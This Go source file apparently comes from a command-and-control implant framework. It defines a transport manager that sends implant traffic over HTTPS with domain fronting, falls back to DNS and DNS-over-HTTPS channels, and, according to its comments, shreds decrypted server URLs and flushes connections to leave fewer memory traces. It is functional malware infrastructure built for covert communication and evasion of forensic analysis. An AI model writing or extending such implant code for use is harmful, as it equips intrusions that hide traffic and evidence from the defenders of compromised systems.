package c2

import (
	"fmt"
	"sync"

	"github.com/Real-Fruit-Snacks/Aquifer/pkg/config"
)

// Transport defines the interface for all C2 communication channels.
// Implementations must be safe for concurrent use.
type Transport interface {
	// Send transmits data to the C2 server and returns the response.
	Send(data []byte) ([]byte, error)
	// Close tears down the transport and releases resources.
	Close() error
	// FlushConnections closes idle connections to prevent URL strings
	// from persisting in heap via connection state.
	FlushConnections()
}

// TransportManager manages primary and fallback transports,
// providing automatic failover when the primary channel is unavailable.
type TransportManager struct {
	mu       sync.RWMutex
	primary  Transport
	fallback []Transport
	cfg      *config.ImplantConfig
}

// NewTransportManager creates a TransportManager with HTTPS as primary
// and DNS/DoH as fallback transports based on the implant configuration.
// The plain-string C2 server list is converted to [][]byte so the HTTPS
// transport can shred decrypted URLs after each use.
func NewTransportManager(cfg *config.ImplantConfig) *TransportManager {
	servers := cfg.C2Servers // capture slice reference
	return NewTransportManagerFromResolver(func() [][]byte {
		result := make([][]byte, len(servers))
		for i, s := range servers {
			result[i] = []byte(s)
		}
		return result
	}, cfg)
}

// NewTransportManagerFromResolver creates a TransportManager using a resolver
// function for HTTPS server URLs. This allows the caller to provide URLs from
// an encrypted source (e.g., ProtectedConfig) so they are only decrypted
// briefly during each Send() call rather than stored in cleartext.
func NewTransportManagerFromResolver(serversFn func() [][]byte, cfg *config.ImplantConfig) *TransportManager {
	primary := NewHTTPSTransport(serversFn, cfg.FrontingDomain, cfg.FrontingHost, cfg.ImplantID)

	fallback := make([]Transport, 0, 2)
	if len(cfg.DNSDomains) > 0 {
		fallback = append(fallback, NewDNSTransport(cfg.DNSDomains))
	}
	if len(cfg.DoHResolvers) > 0 && len(cfg.DNSDomains) > 0 {
		fallback = append(fallback, NewDoHTransport(cfg.DoHResolvers, cfg.DNSDomains))
	}

	return &TransportManager{
		primary:  primary,
		fallback: fallback,
		cfg:      cfg,
	}
}

// SendWithFallback attempts to send data via the primary transport.
// On failure it iterates through fallback transports (DNS, DoH) until
// one succeeds or all are exhausted.
func (tm *TransportManager) SendWithFallback(data []byte) ([]byte, error) {
	tm.mu.RLock()
	defer tm.mu.RUnlock()

	// Attempt primary transport.
	resp, err := tm.primary.Send(data)
	if err == nil {
		return resp, nil
	}

	// Walk through fallback transports in order.
	lastErr := err
	for _, fb := range tm.fallback {
		resp, lastErr = fb.Send(data)
		if lastErr == nil {
			return resp, nil
		}
	}

	return nil, fmt.Errorf("all transports failed, last error: %w", lastErr)
}

// FlushConnections flushes idle connections on all managed transports.
func (tm *TransportManager) FlushConnections() {
	tm.mu.RLock()
	defer tm.mu.RUnlock()
	tm.primary.FlushConnections()
	for _, fb := range tm.fallback {
		fb.FlushConnections()
	}
}

// Close shuts down all managed transports.
func (tm *TransportManager) Close() error {
	tm.mu.Lock()
	defer tm.mu.Unlock()

	var firstErr error
	if err := tm.primary.Close(); err != nil && firstErr == nil {
		firstErr = err
	}
	for _, fb := range tm.fallback {
		if err := fb.Close(); err != nil && firstErr == nil {
			firstErr = err
		}
	}
	return firstErr
}
